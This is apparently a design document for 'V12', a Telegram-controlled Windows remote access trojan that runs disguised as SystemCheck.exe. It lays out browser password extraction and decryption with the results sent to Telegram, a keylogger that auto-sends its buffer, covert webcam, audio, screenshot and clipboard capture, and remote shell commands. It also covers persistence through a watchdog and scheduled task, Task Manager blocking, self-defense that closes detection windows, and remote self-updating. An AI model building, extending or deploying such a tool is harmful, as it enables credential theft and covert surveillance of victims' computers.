# 📊 ARCHITECTURE & LOGIC FLOW - V12

> **Developer:** TsByin  
> **Version:** 12.0 (Hardened, Full-Featured & Optimized)

## **I. FILE & MODULE STRUCTURE**

```
┌─────────────────────────────────────────────────────────────┐
│                     V12.py (Main Entry)                     │
│                  (Version 12.0, ~2000+ lines)               │
│  Bot handlers, ThreadPoolExecutor(12), remote update        │
└──────────────┬──────────────────────────────────────────────┘
               │
       ┌───────┴───────┬───────────┬──────────┬───────┬────────┐
       │               │           │          │       │        │
       ▼       ▼       ▼           ▼          ▼       ▼        ▼
   config   utils  grabber      media     monitor  keylogger
   Setup  Helpers Password   Screenshot  Monitor  Keystroke
   Logging Audit  History    Webcam      Stats    ParentCtrl
   .env    Persist WiFi      Audio/MP4  Clipboard
   NAS     Settings         Stream     Monitor
   Tokens

   watchdog.py ── build riêng thành watchdog.exe
   (giám sát + restart SystemCheck.exe khi crash)
```

---

## **II. WORKFLOW - TỪ STARTUP ĐẾN CHẠY**

### **Phase 1: INITIALIZATION (Startup)**

```
┌─────────────────────────────────────────────────────────┐
│ python V12.py                                           │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 1. Import modules                                       │
│    ├─ from config import API_TOKEN, ADMIN_ID, ...       │
│    ├─ from utils import helpers...                      │
│    ├─ from grabber import password extraction...        │
│    ├─ from media import screenshot/webcam...            │
│    └─ from monitor import SystemMonitor, BotStats       │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 2. config.py LOADS                                      │
│    ├─ Load .env file (API_TOKEN, ADMIN_ID)              │
│    ├─ Setup logging → bot.log                           │
│    ├─ Validate tokens                                   │
│    ├─ Load browser paths, settings                      │
│    └─ Return constants to V12.py                        │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 3. V12.py INITIALIZES GLOBALS                           │
│    ├─ bot = TeleBot(API_TOKEN, num_threads=8)           │
│    ├─ _executor = ThreadPoolExecutor(max_workers=12)    │
│    ├─ bot_stats = BotStats()                            │
│    ├─ BLOCKED_DATA = load_blocked_list()                │
│    ├─ CURRENT_SETTINGS = load_settings()                │
│    └─ State: intrusion_alert, block_mode, taskmgr       │
│       upload_state/_pending_update (lock-safe),         │
│       _EXIT_REASON_FILE, _UPDATE_BACKUP_FILE            │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 4. START MONITORING THREAD                              │
│    ├─ monitor = SystemMonitor(ADMIN_ID, bot, config)    │
│    ├─ threading.Thread(target=monitor.run)              │
│    └─ Thread starts background monitoring               │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 5. BOT POLLING STARTED                                  │
│    ├─ bot.infinity_polling(skip_pending=True)           │
│    ├─ Wait for Telegram messages                        │
│    └─ Ready to handle commands (auto-reconnect loop)    │
└─────────────────────────────────────────────────────────┘
```

---

## **III. CONCURRENT MESSAGE HANDLING**

### **When User Sends Command:**

```
┌────────────────────────────────────────┐
│  Telegram → /status (lệnh nặng)        │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────┐
│ check_status(m) — handler thread (Bot)     │
│ ├─ Auth check: m.from_user.id == ADMIN_ID  │
│ └─ _executor.submit(task)  ← không block   │
└─────────────┬──────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────┐
│ ThreadPoolExecutor(max_workers=12)         │
│ Worker thread picks up task()              │
│ ├─ Collect CPU/RAM/disk/battery/net        │
│ ├─ Format message                          │
│ └─ bot.send_message()                      │
└────────────────────────────────────────────┘
```

**Tất cả lệnh nặng** (/status, /net, /ps, webcam, passwords...) đều được submit vào `_executor` thay vì spawn thread mới mỗi lần.

---

## **IV. EXAMPLE: PASSWORD EXTRACTION FLOW**

### **User sends: 🔑 Lấy Passwords**

```
┌────────────────────────────────────────────────────┐
│ User presses: 🔑 Lấy Passwords                     │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ h_pass(m) handler triggered                        │
│ ├─ Check admin ID                                  │
│ └─ _executor.submit(task)  ← không block polling   │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ Background Task Starts (không block UI)            │
│ ├─ bot.send_message("⏳ Đang trích xuất...")       │
│ └─ outfile = grab_passwords()                      │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ grabber.py: grab_passwords() EXECUTES              │
│                                                    │
│ ┌─ ThreadPoolExecutor(max_workers=4)               │
│ │  ├─ Future 1: Extract from Chrome (5s)           │
│ │  ├─ Future 2: Extract from Edge (5s)             │
│ │  ├─ Future 3: Extract from Firefox (3s)          │
│ │  └─ Future 4: Extract from Coccoc (3s)           │
│ │  = 8s total (parallel, not 16s sequential)       │
│ │                                                  │
│ ├─ Combine all passwords from 4 workers            │
│ ├─ Compress: gzip.open() → file.gz (50% smaller)   │
│ └─ Return compressed filename                      │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ Back in task: Send file to Telegram                │
│ ├─ bot.send_document(m.chat.id, file)              │
│ ├─ cleanup_media_file() - xóa file tạm             │
│ ├─ bot_stats.increment_command()                   │
│ └─ logging.info("Passwords sent successfully")     │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ User nhận file password.txt.gz                     │
│ Task complete, thread exits                        │
└────────────────────────────────────────────────────┘
```

**Key Optimization:** 4 browsers extracted in parallel = **2-3x nhanh hơn!**

---

## **V. MONITOR THREAD - BACKGROUND OPERATIONS**

### **Runs Continuously (mỗi MONITOR_INTERVAL giây):**

```
┌─────────────────────────────────────────────────────┐
│ monitor.run() - Chạy vô hạn (Thread daemon)         │
└──────────────┬──────────────────────────────────────┘
               │
        Loop:
        ├─ Check 1: _check_self_defense()
        │           └─ Auto close detection windows
        │
        ├─ Check 2: _check_blocked_apps()
        │           └─ Nếu block_mode_active:
        │              Kill blocked processes (theo name + cmdline)
        │
        ├─ Check 3: _check_taskmgr()
        │           └─ Nếu taskmgr_locked:
        │              Kill taskmgr.exe liên tục
        │
        ├─ Check 4: _check_cpu_alert()
        │           └─ Nếu CPU > threshold:
        │              Send alert (với debounce 5 min)
        │
        ├─ Check 5: _intrusion_loop()  ← DEDICATED THREAD (không chạy trong main loop)
        │           └─ Nếu intrusion_alert_active:
        │              ├─ Capture 2 frames từ webcam (thread owns self.cap)
        │              ├─ Detect motion (absdiff)
        │              └─ Send photo nếu motion > threshold
        │
        └─ Check 6: _check_clipboard_monitor()  (mỗi 3 tick)
                    └─ Nếu clipboard_monitor_active:
                       ├─ Poll clipboard text
                       └─ Send alert nếu nội dung thay đổi
               │
        stop_event.wait(MONITOR_INTERVAL)  ← không dùng time.sleep, dừng ngay khi stop()
```

**Tối ưu monitor.py:**
- `cpu_percent(interval=0)` — non-blocking (không block 500ms mỗi tick)
- `_intrusion_loop` chạy trong dedicated daemon thread — webcam không block main loop
- `_check_processes()` single-pass — gộp cả blocked apps + taskmgr vào 1 lần `process_iter()`
- `_get_blocked_cached()` — chỉ đọc `blocked.json` khi mtime file thay đổi

**Ví dụ: CPU Alert**

```python
def _check_cpu_alert(self):
    cpu = psutil.cpu_percent(interval=0.5)
    
    if cpu > 95:  # Ngưỡng
        last_alert = self.last_alerts.get('cpu', 0)
        if time.time() - last_alert > 300:  # Chưa alert trong 5 min
            bot.send_message(ADMIN_ID, f"⚠️ CPU: {cpu}%")
            self.last_alerts['cpu'] = time.time()  # Update time
```

**Benefit:** Debounce = không spam alerts, tiết kiệm resources

---

## **VI. REMOTE UPDATE FLOW (/update)**

```
User: /update  (không URL → dùng NAS WebDAV từ .env)
User: /update https://...  (URL trực tiếp)
       │
       ▼
 cmd_update(m) → _executor.submit(download_task)
       │
       ▼
 download_task():
  ├─ requests.get(url, auth=(user,pass), stream=True)
  ├─ Progress: edit message mỗi 4 giây (xx MB / yy MB)
  ├─ Validate: file[:2] == b'MZ' + size > 5MB
  └─ Lưu vào _SystemCheck_new.exe
       │
       ▼
  Bot gửi: [✅ Apply & Restart] [❌ Hủy]
       │
       ▼ (user xác nhận)
 cb_handler: update|apply → _executor.submit(do_swap)
       │
       ▼
 do_swap():
  ├─ shutil.copy2(exe → exe_backup_YYYYMMDD.exe)
  ├─ Lưu .update_backup JSON (backup path + exe path)
  ├─ Viết _update_swap.bat:
  │     timeout 3
  │     move /y _SystemCheck_new.exe SystemCheck.exe
  │     start SystemCheck.exe
  │     del %~f0
  ├─ Popen(bat, DETACHED_PROCESS)
  └─ os._exit(0)  ← giải phóng lock EXE
       │
       ▼ (3 giây sau)
 bat: move new → old path → start SystemCheck.exe

Rollback:
  /rollback → đọc .update_backup → xác nhận
  do_rollback() → swap ngược + os._exit(0)
```

**Lý do PyInstaller `--onefile` không lock EXE gốc:**
Khi chạy, EXE tự extract ra `%TEMP%\_MEIxxxxxx\` rồi chạy từ đó.
EXE gốc trên disk được giải phóng ngay sau khi process thoát → bat file có thể `move /y` sauđó.

---

## **VI-OLD → VII. DATA FLOW - PASSWORD EXTRACTION DETAIL**

```
extracting passwords:

┌─── Chrome (browser_name="Chrome", path=...)
│    └─ get_master_key(path)
│       └─ Read: Local State → os_crypt encrypted_key
│          └─ CryptUnprotectData() → master_key
│    └─ Loop profiles: ["Default", "Profile 1", ...]
│       └─ Open: Login Data (SQLite database)
│          └─ Query: SELECT action_url, username, password
│             └─ For each row:
│                ├─ encrypted_pass[3:15] = IV
│                ├─ encrypted_pass[15:] = cipher
│                └─ AES.MODE_GCM.decrypt() → password
│                   ├─ Remove padding [:-16]
│                   └─ Decode UTF-8
│                      └─ Save: "[Chrome] url | user | pass"
│
├─── Edge (same as Chrome, different path)
│
├─── Firefox (different database format)
│    └─ Open: places.sqlite
│       └─ SELECT url, username, password (stored as plaintext for some)
│          └─ Some may be encrypted differently
│
└─── Others (Coccoc, Brave, Opera...)

Final:
├─ Combine all passwords from all browsers
├─ Write to file: pass.txt
├─ Compress: gzip.open() → pass.txt.gz (50% smaller)
└─ Return: pass.txt.gz
```

---

## **VII. CALLBACK HANDLER - INLINE BUTTONS**

### **When User Clicks Inline Button:**

```
User clicks: 🔑 Passwords (callback_data="cmd_pass")
       │
       ▼
@bot.callback_query_handler(func=lambda c: True)
def cb_handler(c):  # c = callback query
    │
    ├─ Check: c.from_user.id == ADMIN_ID
    │
    ├─ data = c.data = "cmd_pass"
    │
    ├─ if data in CALLBACK_MAP:
    │    └─ CALLBACK_MAP["cmd_pass"](c.message)
    │       └─ Call h_pass(m) ← Same as text button!
    │
    └─ All buttons mapped to same function
```

**Benefit:** Một handler cho cả 2 menu type!

---

## **VIII. FILE STATE & PERSISTENCE**

### **Data Files Created Automatically:**

```
bot.log (Logging)
├─ 2025-12-05 10:15:32 - config - INFO - ✅ Bot configured
├─ 2025-12-05 10:15:33 - monitor - INFO - 🟢 System monitor started
├─ 2025-12-05 10:16:15 - grabber - INFO - Extracted 12 passwords
└─ 2025-12-05 10:17:00 - __main__ - ERROR - Webhook error

blocked.json (Blocked apps/sites)
├─ {"apps": ["taskmgr.exe", "control.exe"], "sites": ["facebook.com", "youtube.com"]}
└─ Auto-updated when /block (đa mục) command used

settings.json (Menu state)
├─ {"menu_mode": 1}  # or 2
└─ Auto-updated when /menu command used
```

---

## **IX. SECURITY FLOW**

```
┌─────────────────────────────────────┐
│ .env file (MUST NOT COMMIT)         │
│ API_TOKEN=xxx                       │
│ ADMIN_ID=xxx                        │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│ config.py loads .env                │
│ os.getenv('API_TOKEN')              │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│ Validate tokens exist               │
│ if not API_TOKEN: raise ValueError  │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│ V12.py uses API_TOKEN               │
│ Never exposed in code               │
└─────────────────────────────────────┘
```

**Advantage over old V10:**
- Cũ: `API_TOKEN = "xxx"` hardcoded (nguy hiểm!)
- Mới: `API_TOKEN = os.getenv('API_TOKEN')` (an toàn!)

---

## **X. THREAD MANAGEMENT**

### **Main Thread:**
```
bot.infinity_polling(timeout=10, skip_pending=True,
    allowed_updates=['message','callback_query'])  ← tự phục hồi
```

### **Monitor Thread (Background):**
```
monitor.run()  ← loop: check CPU, self-defense, process block, clipboard
_intrusion_loop()  ← dedicated thread: webcam motion detection (owns self.cap)
```

### **Task Thread Pool (ThreadPoolExecutor):**
```
_executor = ThreadPoolExecutor(max_workers=12, thread_name_prefix="botworker")

# Tất cả lệnh nặng dùng executor:
_executor.submit(task)   ← /status, /net, /ps, passwords, webcam, stream, /update...
```

**Model:** Producer-Consumer
- Main (Bot polling): Nhận commands, auth check, submit vào pool
- Monitor: Chạy checks độc lập
- Pool workers (12): Thực thi lệnh, không block polling

---

## **XI. MODULE RESPONSIBILITIES**

```
config.py
├─ Load .env (API_TOKEN, ADMIN_ID, NAS_WEBDAV_*)
├─ Setup logging
└─ Define constants + NAS WebDAV vars

utils.py
├─ Window operations
├─ File management
├─ System protection
└─ JSON operations, audit log, settings persist

watchdog.py (build riêng thành watchdog.exe)
├─ Launch SystemCheck.exe
├─ Monitor process (loop: poll exit code)
├─ Restart nếu crash (MAX_RESTARTS=20, RESTART_WINDOW=120s)
└─ Register Task Scheduler AtLogon entry

keylogger.py
├─ pynput listener (window-aware)
├─ _auto_sender_loop: Event.wait(300) ← dừng ngay khi stop()
└─ Tự gửi buffer qua Telegram mỗi 5 phút

grabber.py
├─ Extract passwords (CONCURRENT!)
├─ Extract history
└─ Extract WiFi

media.py
├─ Screenshot
├─ Webcam
├─ Audio recording
└─ Video recording

monitor.py
├─ SystemMonitor class
│  ├─ CPU alerts
│  ├─ Motion detection
│  ├─ App blocking
│  └─ Graceful shutdown
└─ BotStats class
   ├─ Track commands
   └─ Track data size

V12.py (Main)
├─ Telegram handlers
├─ Command routing
├─ State management
└─ Orchestration
```

---

## **XII. QUICK REFERENCE - KEY FLOWS**

```
USER ACTION           →  HANDLER              →  MODULE
─────────────────────────────────────────────────────────────
/start or /menu      →  menu_handler()       →  (display menu)
🔑 Passwords         →  h_pass()             →  grabber.grab_passwords()
📸 Webcam            →  h_cam()              →  media.capture_webcam()
🖼 Screenshot        →  h_scr()              →  media.smart_screenshot()
💓 Stats             →  check_status()       →  monitor.BotStats
⚙️ Processes         →  h_proc()             →  psutil.process_iter()
🚫 Block App/Web     →  toggle_block()       →  monitor check
🔒 Lock TaskMgr      →  toggle_taskmgr()     →  monitor check
📂 Browse Files      →  h_exp()              →  os.listdir()
/block app a b c     →  block_mgr()          →  save blocked_data + firewall/hosts
/block site x y      →  block_mgr()          →  save blocked_data + firewall/hosts
/cmd ls              →  run_shell()          →  subprocess.run()
/update [url]        →  cmd_update()         →  requests.get(NAS) + swap bat
/rollback            →  cmd_rollback()        →  read .update_backup + swap bat
/stop                →  h_stop() + callback  →  os._exit(0)
```

---

**✅ Now you understand the complete architecture!**
